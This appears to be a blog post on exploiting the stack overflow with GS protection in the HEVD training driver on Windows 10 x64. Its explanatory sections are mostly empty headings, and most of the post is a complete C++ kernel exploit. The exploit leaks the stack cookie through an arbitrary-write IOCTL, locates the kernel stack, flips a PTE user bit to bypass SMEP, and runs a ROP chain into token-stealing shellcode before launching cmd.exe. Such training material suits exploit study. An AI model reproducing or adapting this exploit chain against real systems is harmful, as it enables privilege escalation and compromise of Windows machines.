---
layout: default
title: HEVD Exploit - Stack OverflowGS on Windows 10 RS5 x64
date: 2021-01-15
tags:
  - test1
  - test2
---

## Introduction
This is my first blog post on HEVD exploit training (and first blog post overall). I'm writing this to return my debt to the tech community that posted HEVD write-ups that helped me learn so much. There are a lot of HEVD write-ups but unfortunately not for updated systems - usually the write-ups are for Windows 7 and 32 bit. 

This post is all about updated Windows 10 x64, one that I got directly from [Hyper-V Manager's "Quick Create" method](https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/quick-create-virtual-machine) (Windows 10 dev environment).
The post will assume knowledge of basic exploitation methods and x86/64 assembly.

Exploiting Stack Overflow with GS (Stack protection) enabled on x64 programs is not straight-forward. Moreover, it seems like it's not possible on it's own. For that reason we will chain together an Arbitrary Read exploit to help us exploit it. The reason it's needed is explained in this post.
Bypassing SMEP is also interesting as CR4 modification is protected using HyperGuard. We'll do it using PTE bit-flipping and see how to not cause double-fault BSOD when trying to execute our usermode shellcode.
My method of training involves writing (almost) everything from scratch. Because in a later post we will need to adjust our shellcode, I will also include here my own method of writing the shellcode.

Our setup will be:
* Windows 10 version 2004 build 19041.746 as the Host machine
* Windows 10 version 2004 build 19041.685 as the Guest machine running on Hyper-V
* Windbg Preview as the kernel debugger

The exploition steps will be:
1. Analyze the vulnerability in IDA
2. Trigger the vulnerability and find interesting offsets
3. Bypass GS stack protection
4. Write a token-stealing shellcode
5. Bypass SMEP


## Anaylizing the vulnerability
Finding the vulnerable function is not interesting in HEVD because the driver is filled with debug prints, so we'll skip it and go directly to that function.
The decompiled function is pretty straight forward:  
![](/assets/images/bof_gs/bufferOverflowGS_internal_decompilation.jpg)

A good thing to note here is that IDA (7.5) ignores calls to Stack Cookie checks (1) and also exception handlers (2):  
![](/assets/images/bof_gs/bufferOverflowGS_gs_exception_handler.jpg)

Most of the exploitation tutorials on bypass GS protections use the exception handler as the [bypass](https://web.archive.org/web/20201206144133/https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/) [method](http://ith4cker.com/content/uploadfile/201601/716b1451824309.pdf?tonalq=jvb2o3). It makes use of the fact that **if** the vulnerable function is wrapped with try/except then on 32 bit programs it will cause an exception handler address to be placed on the stack right besides the stack cookie. Then, overwriting that handler and causing an exception before the function gets to checking the cookie causes the exception handler to be called and in reality - our own pointer that we put there.  
But in 64 bit program [this is not how it works](https://www.osronline.com/article.cfm%5earticle=469.htm#:~:text=Because%20the%20x64,within%20the%20module) anymore. It was changed because the overhead of putting the exception handler on the stack everytime is costly and because it was susceptible to buffer overflow attacks.  
Therefore we'll need to find another way to bypass that protection.

## GS Stack Protection bypass

## Writing the shellcode

## Bypassing SMEP

## Putting it all together

## Thanks

Notes:
1. We could use dynamic pattern search on our loaded hevd.sys image to find the MiGetPteAddress instead of using a constant offset
2. Locating the CTL_CODE in the stack is something we can do in the shellcode itself, and actually I'll demonstrate it in a later post

```cpp
#include "main.h"


BOOL ExploitStackOverflowGS()
{

    HANDLE hDevice = INVALID_HANDLE_VALUE;  
    BOOL bResult = FALSE;                 
    DWORD junk = 0;                     
    char inBuf[STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH] = { 'A' };

    char buf[1000] = { 0 };
    PDWORD fOld = NULL;
    LPVOID shellcode;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    hFile = CreateFile(L"sc.bin",       
                              GENERIC_READ,  
                              FILE_SHARE_READ, 
                              NULL,             
                              OPEN_EXISTING,         // existing file only
                              FILE_ATTRIBUTE_NORMAL, // normal file
                              NULL);                

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open sc.bin file for reading\n");
        bResult = FALSE;
        goto _cleanup;
    }

    DWORD scSize = 0;
    bResult = ReadFile(hFile, buf, 1000, &scSize, NULL);
    if (!bResult) {
        printf("[-] Failed to read shellcode from file: %d\n", GetLastError());
        bResult = FALSE;
        goto _cleanup;
    }
    printf("[*] Shellcode size is: %d\n", scSize);

    shellcode = VirtualAlloc(
        NULL,               // Next page to commit
        scSize,             // Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,   // Allocate a committed page
        PAGE_EXECUTE_READWRITE);    // Read/write access

    if (shellcode == NULL) {
        printf("[-] Unable to reserve memory for shellcode!\n");
        bResult = FALSE;
        goto _cleanup;
    }
    memcpy(shellcode, buf, scSize);

    // Get ntoskrnl and hevd.sys base
    LPVOID drivers[0x500] = {0}; // Should be more than enough
    DWORD cbNeeded;
    LPVOID ntoskrnlBase = NULL, hevdBase = NULL;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        for (int i = 0; i < cbNeeded / sizeof(LPVOID); i++) {
            char szDriver[0x100] = { 0 }; // Again, more than enough
            GetDeviceDriverBaseNameA(drivers[i], szDriver, 0x100);
            if (strcmp("ntoskrnl.exe", szDriver) == 0) {
                ntoskrnlBase = drivers[i];
                printf("[+] Found ntoskrnl.exe at: 0x%p\n", ntoskrnlBase);
            }
            if (strcmp("HEVD.sys", szDriver) == 0) {
                hevdBase = drivers[i];
                printf("[*] Found HEVD.exe at: 0x%p\n", hevdBase);
            }
            if (hevdBase && ntoskrnlBase) break;
        }
    } else {
        printf("[-] Failed EnumDeviceDrivers: %d\n", GetLastError());
        bResult = FALSE;
        goto _cleanup;
    }

    if (!hevdBase) {
        printf("[-] Failed to find the base of HEVD.sys\n");
        bResult = FALSE;
        goto _cleanup;
    }
    if (!ntoskrnlBase) {
        printf("[-] Failed to find the base of ntoskrnl.exe\n");
        bResult = FALSE;
        goto _cleanup;
    }


    // Find HEVD.sys _data section to read the stack cookie
    HANDLE hHevdLocalBase = LoadLibraryExA("C:\\Users\\User\\Desktop\\HEVD.sys", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hHevdLocalBase) {
        printf("[-] Failed to load local HEVD.sys: %d\n", GetLastError());
        bResult = FALSE;
        goto _cleanup;
    }
    printf("[*] Loaded local HEVD.sys\n");
    printf("[+] Searching for .data section offset\n");
    PIMAGE_NT_HEADERS hevdImageHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)hHevdLocalBase + ((PIMAGE_DOS_HEADER)hHevdLocalBase)->e_lfanew);
    ULONG_PTR hevdSectionLocation = IMAGE_FIRST_SECTION(hevdImageHeader);
    DWORD hevdDataSectionOffset = 0;

    for (int i = 0; i < hevdImageHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hevdSection = (PIMAGE_SECTION_HEADER)hevdSectionLocation;
        if (strcmp(hevdSection->Name, ".data") == 0) {
            hevdDataSectionOffset = hevdSection->VirtualAddress;
        }
        hevdSectionLocation += sizeof(IMAGE_SECTION_HEADER);
    }
    if (hevdDataSectionOffset == 0) {
        printf("[-] Failed locating the .data section of hevd.sys locally\n");
        bResult = FALSE;
        goto _cleanup;
    }
    printf("[*] Offset of .data section of hevd.sys is: %d\n", hevdDataSectionOffset);
    intptr_t hevdDataSection = hevdDataSectionOffset + (intptr_t)hevdBase;
    printf("[*] The .data section of hevd.sys in the kernel is at: 0x%llx\n", hevdDataSection);


    hDevice = CreateFileW(DRIVER_NAME,          // drive to open
                          0,                // no access to the drive
                          FILE_SHARE_READ | // share mode
                          FILE_SHARE_WRITE,
                          NULL,             // default security attributes
                          OPEN_EXISTING,    // disposition
                          0,                // file attributes
                          NULL);            // do not copy file attributes

    if (hDevice == INVALID_HANDLE_VALUE)    // cannot open the drive
    {
        printf("[-] Failed opening handle to driver\n");
        return (FALSE);
    }
    printf("[*] Opened driver handle\n");

    ULONGLONG whereBuffer = 0;
    WriteWhatWhereBuffer wwwBuf = { 0 };
    wwwBuf.what = hevdDataSection;
    wwwBuf.where = &whereBuffer;

    printf("[+] Leaking the stack cookie from the .data section\n");
    bResult = DeviceIoControl(hDevice,                       // device to be queried
                              HEVD_IOCTL_ARBITRARY_WRITE, // operation to perform
                              &wwwBuf, sizeof(wwwBuf),                       // no input buffer
                              NULL, 0,            // output buffer
                              &junk,                         // # bytes returned
                              (LPOVERLAPPED)NULL);          // synchronous I/O

    if (!bResult) {
        printf("[-] Failed sending IOCTL\n");
        bResult = FALSE;
        goto _cleanup;
    }

    if (whereBuffer == 0) {
        printf("[-] Failed leaking the stack cookie\n");
        bResult = FALSE;
        goto _cleanup;
    }
    ULONGLONG stackCookie = whereBuffer;
    printf("[*] Stack cookie is: 0x%llx\n", stackCookie);

    /////// Leak stack base


    HMODULE ntdll = GetModuleHandleA("ntdll");
    _NtQuerySystemInformation query = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (query == NULL) {
        printf("[-] GetProcAddress(NtQuerySystemInformation) failed.\n");
        return 1;
    }
    ULONG len = 2000;
    NTSTATUS status = NULL;
    PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
    do {
        len *= 2;
        pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
        status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);
    if (status != STATUS_SUCCESS) {
        printf("[-] NtQuerySystemInformation failed with error code 0x%X\n", status);
        return 1;
    }

    UNICODE_STRING myProc = { 0 };
    my_RtlInitUnicodeString myRtlInitUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
    my_RtlEqualUnicodeString myRtlEqualUnicodeString = (my_RtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
    if (myRtlInitUnicodeString == NULL || myRtlEqualUnicodeString == NULL) {
        printf("[-] Failed initializing unicode functions\n");
        bResult = FALSE;
        goto _cleanup;
    }

    myRtlInitUnicodeString(&myProc, L"HevdExploits.exe");
    printf("[+] Iterating processes threads, looking for our kernel stack address\n");
    PVOID stackLimit = NULL;
    while (pProcessInfo != NULL) {
        if (myRtlEqualUnicodeString(&(pProcessInfo->ImageName), &myProc, TRUE)) {
            printf("[*] Process: %wZ\n", pProcessInfo->ImageName);
            for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
                PVOID stackBase = pProcessInfo->Threads[i].StackBase;
                stackLimit = pProcessInfo->Threads[i].StackLimit;
                printf("\tStack base 0x%llx\n", stackBase);
                printf("\tStack limit 0x%llx\n", stackLimit);
                break;
            }
        }

        if (!pProcessInfo->NextEntryOffset) {
            pProcessInfo = NULL;
        } else {
            pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
        }
    }
    printf("[+] Searching down from stack limit: 0x%llx\n", stackLimit);
    intptr_t stackSearch = (intptr_t)stackLimit - 0xff0;

    BOOL foundControlCode = FALSE;
    while (stackSearch < (intptr_t)stackLimit - 0x10) {
        wwwBuf.what = stackSearch;
        wwwBuf.where = &whereBuffer;

        bResult = DeviceIoControl(hDevice,                       // device to be queried
                                  HEVD_IOCTL_ARBITRARY_WRITE, // operation to perform
                                  &wwwBuf, sizeof(wwwBuf),                       // no input buffer
                                  NULL, 0,            // output buffer
                                  &junk,                         // # bytes returned
                                  (LPOVERLAPPED)NULL);          // synchronous I/O

        if (!bResult) {
            printf("[-] Failed sending IOCTL\n");
            bResult = FALSE;
            goto _cleanup;
        }
        if (whereBuffer == 0x22200B) {
            printf("[*] Found CTL_CODE in the stack at: 0x%llx\n", stackSearch);
            foundControlCode = TRUE;
            break;
        }
        stackSearch += sizeof(intptr_t);
    }
    if (!foundControlCode) {
        printf("[-] Failed finding control code in stack\n");
        bResult = FALSE;
        goto _cleanup;
    }

    // sub 0x50 from ctl_code to rsp at the start of BufferOverflowGS_internal
    // sub more 0x230 to get the right xored rsp
    // sub again 5 * 8 for five pushes
    ULONGLONG rsp = stackSearch - 0x50 - 0x230 - 0x28;
    printf("[*] RSP that get xored with stack cookie at BufferOverflowGS_internal should be: 0x%llx\n", rsp);
    ULONGLONG xoredCookie = rsp ^ stackCookie;
    printf("[*] Xored cookie is: 0x%llx\n", xoredCookie);

    /////// Flip the Owner bit for our shellcode's PTE
    // Add 0x13 to read only the PTE base
    uintptr_t readAddress = (uintptr_t)ntoskrnlBase + MiGetPteAddressOffset + 0x13;
    wwwBuf.what = readAddress;
    wwwBuf.where = &whereBuffer;

    printf("[+] Getting PTE_BASE value\n");
    bResult = DeviceIoControl(hDevice,                       // device to be queried
                              HEVD_IOCTL_ARBITRARY_WRITE, // operation to perform
                              &wwwBuf, sizeof(wwwBuf),                       // no input buffer
                              NULL, 0,            // output buffer
                              &junk,                         // # bytes returned
                              (LPOVERLAPPED)NULL);          // synchronous I/O

    if (!bResult) {
        printf("[-] Failed sending IOCTL\n");
        bResult = FALSE;
        goto _cleanup;
    }

    if (whereBuffer == 0) {
        printf("[-] Failed getting PteBase!\n");
        return FALSE;
    }
    printf("[*] Got PteBase: 0x%llx\n", whereBuffer);
    ULONGLONG pteBase = whereBuffer;


    uintptr_t scPte = getPteAddress(shellcode, pteBase);
    printf("[*] Shellcode at: 0x%llx\n", shellcode);
    printf("[*] Got PteAddress of shellcode: 0x%llx\n", scPte);

    // Read the PTE data, flip the user bit and write it back
    whereBuffer = 0;
    wwwBuf.what = scPte;
    wwwBuf.where = &whereBuffer;

    printf("[+] Reading our shellcode's PTE data\n");
    bResult = DeviceIoControl(hDevice,                       // device to be queried
                              HEVD_IOCTL_ARBITRARY_WRITE, // operation to perform
                              &wwwBuf, sizeof(wwwBuf),                       // no input buffer
                              NULL, 0,            // output buffer
                              &junk,                         // # bytes returned
                              (LPOVERLAPPED)NULL);          // synchronous I/O

    if (whereBuffer == 0) {
        printf("[-] Failed getting shellcode's PTE data!\n");
        bResult = FALSE;
        goto _cleanup;
    }
    printf("[*] PTE Data of shellcode: 0x%llx\n", whereBuffer);

    // Reset the User bit to zero - now it's kernel
    ULONGLONG wantedPteValue = whereBuffer & ~0x4;

    /*
    *(ULONGLONG*)(inBuf + 568) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RCX);
    *(ULONGLONG*)(inBuf + 576) = (ULONGLONG)(scPte);
    *(ULONGLONG*)(inBuf + 584) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RAX);
    *(ULONGLONG*)(inBuf + 592) = (ULONGLONG)(wantedPteValue);
    *(ULONGLONG*)(inBuf + 600) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + MOV_RCX_RAX);
    *(ULONGLONG*)(inBuf + 608) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + WBINVD_GADGET);


    printf("[+] Trigerring BufferOverflow that bypasses SMEP and flushes the cache\n");
    bResult = DeviceIoControl(hDevice,                       // device to be queried
                              HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS, // operation to perform
                              inBuf, STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH,                       // no input buffer
                              NULL, 0,            // output buffer
                              &junk,                         // # bytes returned
                              (LPOVERLAPPED)NULL);          // synchronous I/O

    if (!bResult) {
        printf("[-] Failed sending IOCTL\n");
        bResult = FALSE;
        goto _cleanup;
    }
    */


   // Spray the TLB Cache
   printf("[+] Invalidating the TLB cache\n");
   LPVOID* arr[CACHE_SPRAY_SIZE];
   char arr2[CACHE_SPRAY_SIZE];
   for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
       //arr[i] = malloc(4096);
       arr[i] = VirtualAlloc(NULL, 5000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
       *(char *)arr[i] = 1;
       arr2[i] = *(char*)arr[i];
   }

   printf("[*] Finished invalidating the TLB cache\n");

   // Prepare the ROP chain
    *(ULONGLONG*)(inBuf + 568) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RCX);
    *(ULONGLONG*)(inBuf + 576) = (ULONGLONG)(scPte);
    *(ULONGLONG*)(inBuf + 584) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + POP_RAX);
    *(ULONGLONG*)(inBuf + 592) = (ULONGLONG)(wantedPteValue);
    *(ULONGLONG*)(inBuf + 600) = (ULONGLONG)((ULONGLONG)ntoskrnlBase + MOV_RAX_TO_PTR_RCX);
    *(ULONGLONG*)(inBuf + 608) = (ULONGLONG)(shellcode);

    printf("[+] Trigerring BufferOverflow that will run our shellcode\n");
    bResult = DeviceIoControl(hDevice,                       // device to be queried
                              HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS, // operation to perform
                              inBuf, STACK_OVERFLOW_GS_EXPLOIT_BUFFER_LENGTH,                       // no input buffer
                              NULL, 0,            // output buffer
                              &junk,                         // # bytes returned
                              (LPOVERLAPPED)NULL);          // synchronous I/O

    if (!bResult) {
        printf("[-] Failed sending IOCTL\n");
        bResult = FALSE;
        goto _cleanup;
    }

    printf("[*] Success! Starting shell..\n");

    for (int i = 0; i < CACHE_SPRAY_SIZE; i++) {
        VirtualFree(arr[i], 0, MEM_RELEASE);
    }

    system("cmd.exe");
    system("pause");

_cleanup:
    if (hDevice) CloseHandle(hDevice);
    if (hFile) CloseHandle(hFile);


    return bResult;
}
```